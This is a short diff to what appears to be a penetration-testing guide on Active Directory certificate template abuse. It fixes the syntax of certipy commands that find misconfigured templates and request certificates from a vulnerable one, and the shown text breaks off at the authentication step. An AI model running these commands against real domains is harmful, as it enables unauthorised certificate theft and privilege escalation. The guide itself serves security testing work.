@@ -55,11 +55,11 @@ Certificate templates define which users can request specific types of certifica
 
 - Find templates and identify misconfigurations:
 ```
-certipy find -u {username} -p {password} -d {domain}
+certipy find -u {domain/username} -p {password} -dc-ip {DC_IP}
 ```
 - Request a certificate from a vulnerable template:
 ```
-certipy request -u {username} -p {password} -d {domain} -template {template_name}
+certipy request -u {domain/username} -p {password} -template {template_name}  -dc-ip {DC_IP}
 ```
 - Authenticate using the obtained certificate:
 ```
